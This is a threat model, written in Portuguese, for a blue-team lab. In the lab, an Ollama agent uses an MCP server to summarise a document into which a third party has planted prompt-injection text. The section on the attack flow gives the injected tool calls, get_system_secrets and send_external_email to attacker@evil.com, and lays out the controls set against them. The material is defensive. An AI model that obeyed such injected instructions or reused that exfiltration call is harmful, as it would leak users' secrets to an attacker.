# Threat model — ARQVORA Blue Team v2

## Ativos e atores

- Ativos: dados fictícios de beneficiários, documentos, solicitações e trilhas de auditoria. Uma aplicação real também protegeria segredos, tokens, dados clínicos e rede interna.
- Usuário legítimo: P001, identificado pelo host **somente para simulação**.
- Atacante: controla o conteúdo de `DOC-101` ou de uma observação externa, mas não deve controlar identidade/sessão/escopo do host.
- Agente: Ollama local, que pode emitir tool calls incorretas ou repetir texto hostil.
- Servidor MCP: processo `stdio` que revalida autorização e executa somente casos de uso explícitos.

## Fluxo de ataque modelado

1. Um usuário autenticado pede: "resuma DOC-101".
2. O MCP retorna o relatório com instruções maliciosas inseridas por terceiro.
3. O texto tenta transformar dados em comandos: `get_system_secrets` e `send_external_email(attacker@evil.com, ...)`.
4. Sem controles, um agente com ferramentas privilegiadas poderia produzir vazamento.
5. **V2:** o host expõe somente leitura no fluxo de resumo, o catálogo MCP não possui ferramentas perigosas e qualquer tentativa de uso de uma ferramenta genérica é negada.
6. O canal de notificação existente é restrito: apenas template fechado, destinatário definido no backend, aprovação por humano, token HMAC ligado à operação, auditado; **não envia email real**.

## Fronteiras e controles

| Fronteira | Controle | Falha que evita |
|---|---|---|
| Conteúdo externo -> LLM | Conteúdo marcado como não confiável | Reduz confusão entre dado e instrução, mas NÃO garante comportamento do modelo |
| LLM -> Host | Exposição de tools por intenção e catálogo fechado | Evita tool calls arbitrárias |
| Host -> MCP | Verificação de catálogo e parâmetros | Reduz surpresas de alterações de tools |
| MCP -> banco | Escopo por tarefa, IDOR/BOLA, validação de template | Bloqueia escalonamento por documento e acesso cruzado |
| MCP -> notificações | Corpo fixo, destino derivado do banco | Elimina canal livre para exfiltração neste laboratório |
| Aprovação -> escrita | HMAC, expiração, nonce de uso único e vinculação ao payload | Evita replay e modificação dos parâmetros aprovados |
| Execução -> auditoria | Trilha com decisão e razão resumida | Apoia resposta a incidentes sem copiar documentos/segredos |

## O que isto NÃO resolve

- Modelo ainda pode gerar resumo incorreto, citar o payload ou inventar uma ação (sem executá-la).
- Se o processo MCP ou o HOST forem comprometidos, podem ler suas variáveis de ambiente e acessar recursos permitidos pelo SO.
- A identidade baseada em variáveis de ambiente é demonstração, **não autenticação de produção**.
- A allowlist inspeciona o nome e os campos das ferramentas; não há verificação de assinatura/atestado do binário ou esquema completo do MCP.
- Este código não substitui sistema de classificação DLP, sandboxes, rede sem saída (*egress deny*), OIDC, proteção LGPD, nem controles de cadeia de suprimentos.
- O banco é local e contém apenas dados fabricados. Nunca execute o exemplo inseguro com segredos ou endpoints reais.

## Produção: requisitos de endurecimento

1. Contas/identidades separadas por agente e ferramentas; scopes de OAuth/OIDC com audiência e prazo curtos.
2. MCP em contêiner restrito (`--read-only`, usuário não-root, volumes mínimos e sem acesso a Docker socket).
3. Negar *egress* por padrão; permitir somente endpoints corporativos específicos mediante autorização. Bloqueio no SO/rede, não apenas em Python.
4. Credenciais em secret manager: nunca entregar valores ao modelo; disponibilizar APIs de operações que usam o segredo sem revelá-lo.
5. Revisão de ferramentas MCP externas, assinaturas/versions pinning, SCA/SBOM, verificação de alterações de contrato.
6. Segregar operações de leitura e escrita, fluxos com aprovações explícitas e testes de coerência do pedido original.
7. SIEM/alertas para negativas e padrões anômalos, limites de tokens/steps/frequência, revisão de retenção e LGPD.
8. Red-team contínuo com corpus de documentos de prompt injection; testes de saída e de chamadas em diferentes modelos.

## Referências

- https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html
- https://owasp.github.io/DevSecOpsGuideline/2-Process/2-2-Develop/2-2-5-AI-Agent-and-MCP-Security/
- https://cheatsheetseries.owasp.org/cheatsheets/AI_Agent_Security_Cheat_Sheet.html
- https://py.sdk.modelcontextprotocol.io/v1/
- https://docs.ollama.com/capabilities/tool-calling
